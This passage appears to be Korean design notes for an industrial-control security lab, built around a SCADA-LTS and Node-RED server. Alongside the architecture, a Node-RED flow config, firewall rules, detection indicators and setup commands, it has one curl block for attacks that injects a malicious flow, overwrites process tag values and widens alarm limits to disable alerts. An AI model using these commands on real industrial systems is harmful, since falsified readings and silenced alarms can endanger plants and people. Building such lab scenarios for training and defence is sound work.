...
운영자 PC(192.168.201.21-22)는 이 서버의 웹 기반 HMI에 접속하여 공정 상태를 모니터링한다. 데이터 흐름은 단방향(PLC → Node-RED → SCADA-LTS → 운영자 HMI)으로 설계되며, 이는 실제 산업 환경의 Purdue 모델 Level 2-3 구간을 모사한다.
...
+==============================================================================+
    ...
    OPNSense-5 (방화벽)
         |
    Industrial DMZ (192.168.200.0/24) --- 태그 쿼리만 허용 (인바운드)
```
...
[
    ...
    },
    {
        ...
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://192.168.201.11:5000/api/status",
        "tls": "",
        "persist": false,
        "proxy": "",
    ...
    },
    {
        ...
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "http://192.168.201.10:8080/api/httpds",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
...
```bash
# SCADA-LTS 웹 콘솔 로그인
curl -X POST http://192.168.201.10:8080/api/auth/login \
...
curl http://192.168.201.10:1880

# 현재 플로우 조회
curl http://192.168.201.10:1880/flows

# 플로우 배포 (악성 플로우 주입)
curl -X POST http://192.168.201.10:1880/flows \
  -H "Content-Type: application/json" \
...
curl -X PUT http://192.168.201.10:8080/api/point_value/set/DP_TEMP_01 \
  -H "Content-Type: application/json" \
...
for tag in DP_TEMP_01 DP_PRES_01 DP_FLOW_01 DP_POWR_01; do
  curl -X PUT "http://192.168.201.10:8080/api/point_value/set/${tag}" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer <token>" \
    -d '{"value": 25.0, "type": "NUMERIC"}'
done
...
curl -X PUT http://192.168.201.10:8080/api/event_detector/ED_TEMP_HIGH \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"limit": 999.0}'

# 알람 하한을 극단적으로 낮춤
curl -X PUT http://192.168.201.10:8080/api/event_detector/ED_TEMP_LOW \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <token>" \
  -d '{"limit": -999.0}'
```
...
# 대상: 192.168.201.10 (Rocky Linux 9)
...
echo "=== 설치 완료 ==="
echo "SCADA-LTS: http://192.168.201.10:8080/ScadaLTS/"
echo "Node-RED:  http://192.168.201.10:1880"
...
# 임포트 확인
curl -s http://192.168.201.10:1880/flows | python3 -m json.tool | head -20
```
...
|------|------|--------|--------|---------------|------|------|
| 1 | IN | 192.168.200.10 (Ind.DMZ) | 192.168.201.10 | TCP/8080 | ALLOW | 태그 쿼리 (SCADA API) |
...
| 비정상 접속 IP | 192.168.201.0/24 외부에서 접근 | 높음 | OT 존 외부에서의 접근 시도 |
...
```bash
# SCADA 서버 (192.168.201.10) crontab
# crontab -e
